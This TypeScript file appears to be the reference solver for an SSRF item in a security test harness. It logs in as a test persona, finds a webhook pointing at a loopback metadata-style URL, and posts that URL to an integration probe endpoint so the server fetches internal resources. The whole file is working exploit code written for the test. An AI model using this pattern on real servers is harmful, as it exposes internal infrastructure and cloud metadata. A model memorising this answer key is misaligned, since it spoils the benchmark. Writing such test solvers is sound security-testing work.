// Direct SSRF: discover the loopback metrics-relay origin from the webhook targets, then point the
// integration connector probe straight at it so the server fetches internal infrastructure.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

interface WebhookItem { url?: string }

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const listRes = await ctx.fetch(ctx.plan.routes.webhookList!.path, { method: 'GET' })
  const list = (await listRes.json()) as { items?: WebhookItem[] }
  const internal = list.items?.find((w) => /127\.0\.0\.1:\d+\/latest\/meta-data/.test(String(w.url)))?.url
  if (!internal) return

  const path = ctx.plan.routes.integrationFetch!.path.replace(/:[A-Za-z0-9_]+/, 'probe')
  const urlField = ctx.plan.params.webhookUrl ?? 'url'
  const body: Record<string, string> = {}
  body[urlField] = internal
  await ctx.fetch(path, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body),
  })
}
